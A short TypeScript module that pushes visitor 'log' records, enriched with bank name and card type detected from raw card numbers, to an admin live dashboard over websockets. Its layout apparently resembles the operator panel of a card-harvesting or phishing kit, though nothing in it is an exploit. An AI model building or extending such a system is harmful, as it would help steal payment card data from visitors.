import { detectBankName, detectCardType } from '@/lib/cardUtils';
import { logsDb } from '@/lib/db';
import type { Log } from '@/lib/db/types';
import { computeLiveVisitorStats } from '@/lib/liveVisitorStats';
import { broadcastAdminLive, broadcastLogDeleted, broadcastLogUpdate } from '@/lib/ws/broadcast';

let statsBroadcastTimer: ReturnType<typeof setTimeout> | null = null;

function scheduleLiveStatsBroadcast() {
  if (statsBroadcastTimer) return;
  statsBroadcastTimer = setTimeout(() => {
    statsBroadcastTimer = null;
    void (async () => {
      try {
        const liveLogs = await logsDb.findForLiveStats();
        broadcastAdminLive({
          type: 'stats:update',
          stats: computeLiveVisitorStats(liveLogs),
          ts: Date.now(),
        });
      } catch {
        /* ignore */
      }
    })();
  }, 400);
}

export function enrichLogForBroadcast(log: Log): Log {
  if (!log.cardNumber) return log;
  return {
    ...log,
    bankName: detectBankName(log.cardNumber),
    cardType: detectCardType(log.cardNumber),
  };
}

export function notifyLogCreated(log: Log | null): void {
  if (!log) return;
  broadcastLogUpdate(enrichLogForBroadcast(log), 'log:created');
  scheduleLiveStatsBroadcast();
}

export function notifyLogUpdated(log: Log | null): void {
  if (!log) return;
  broadcastLogUpdate(enrichLogForBroadcast(log), 'log:updated');
  scheduleLiveStatsBroadcast();
}

export function notifyLogDeleted(logId: string): void {
  broadcastLogDeleted(logId);
  scheduleLiveStatsBroadcast();
}
